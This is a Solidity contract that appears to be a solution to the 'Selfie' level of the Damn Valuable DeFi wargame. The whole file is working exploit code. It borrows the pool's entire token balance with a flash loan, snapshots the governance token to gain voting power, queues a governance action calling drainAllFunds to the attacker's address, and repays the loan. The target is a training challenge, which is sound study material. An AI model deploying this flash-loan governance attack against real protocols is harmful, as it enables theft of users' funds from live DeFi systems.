// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.7;

// import "hardhat/console.sol";

interface IERC20 {
    function balanceOf(address addr) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes memory data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function governance() external returns (ISimpleGovernance);

    function flashLoan(uint256 borrowAmount) external;
}

contract SelfieChallenge {
    address attacker;
    address pool;
    uint256 public actionId;

    constructor() {
        attacker = msg.sender;
    }

    function attack(address _pool, address _token) external {
        require(msg.sender == attacker);
        pool = _pool;
        uint256 borrowAmount = IERC20(_token).balanceOf(_pool);
        ISelfiePool(_pool).flashLoan(borrowAmount);
    }

    function receiveTokens(address _token, uint256 _borrowAmount) external {
        require(msg.sender == pool);
        IDamnValuableTokenSnapshot(_token).snapshot();
        ISimpleGovernance governance = ISelfiePool(msg.sender).governance();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );

        actionId = governance.queueAction(msg.sender, data, 0);
        IERC20(_token).transfer(msg.sender, _borrowAmount);
    }
}
